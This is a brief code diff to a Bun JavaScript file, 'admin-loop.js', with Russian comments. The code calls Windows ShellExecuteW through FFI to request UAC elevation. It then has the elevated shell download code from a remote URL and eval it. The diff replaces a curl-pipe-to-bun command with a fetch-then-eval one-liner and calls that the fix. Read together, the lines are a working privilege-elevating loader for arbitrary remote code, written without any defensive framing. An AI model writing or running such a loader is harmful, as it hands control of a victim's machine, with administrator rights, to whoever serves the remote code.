@@ -1,6 +1,5 @@
 // admin-loop.js
 (async () => {
-  // Динамический импорт внутри асинхронной функции
   const { dlopen, FFIType, ptr } = await import("bun:ffi");
 
   const shell32 = dlopen("shell32.dll", {
@@ -31,8 +30,8 @@
   console.log("❌ Не админ. Запрос UAC...");
   const url = "https://githubusercontent.com";
   
-  // Команда для UAC: используем curl, чтобы точно получить ТОЛЬКО тело (body)
-  const payload = `curl -sL ${url} | bun -`;
+  // РЕШЕНИЕ: Передаем в UAC команду, которая заставит НОВЫЙ bun сам скачать код
+  const payload = `bun -e "fetch('${url}').then(r=>r.text()).then(eval)"`;
 
   shell32.symbols.ShellExecuteW(0, toPtr("runas"), toPtr("cmd.exe"), toPtr("/k " + payload), 0, 1);
   process.exit(0);
